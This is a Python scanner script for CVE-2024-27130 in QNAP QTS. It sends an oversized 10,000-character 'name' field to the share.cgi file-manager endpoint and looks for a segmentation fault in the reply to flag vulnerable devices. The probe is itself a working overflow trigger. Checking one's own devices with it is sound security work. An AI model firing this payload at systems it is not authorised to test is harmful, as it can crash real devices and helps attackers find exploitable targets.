#!/usr/bin/python3
import requests
import argparse
import urllib3
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_vulnerability(url):
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    full_url = f"{base_url}/cgi-bin/filemanager/share.cgi"
    payload = {
        'func': 'get_file_size',
        'total': '1',
        'path': '/',
        'name': 'A' * 10000
    }

    try:
        print(f'full_url {full_url}')
        response = requests.post(full_url, data=payload, verify=False, timeout=5)
        print(response.text)
        if response.status_code == 200:
            if "SIGSEGV" in response.text:
                print(f"The target {base_url} is vulnerable to CVE-2024-27130")
            else:
                print(f"The target {base_url} is OK to CVE-2024-27130")
        else:
            print(f"Failed to check  for {base_url}. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while checking {base_url}: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description="QNAP QTS CVE-2024-27130 Scanner")
    parser.add_argument("--url", required=True, help="Target URL (e.g., http://192.168.0.1/)")
    args = parser.parse_args()

    check_vulnerability(args.url)

if __name__ == "__main__":
    main()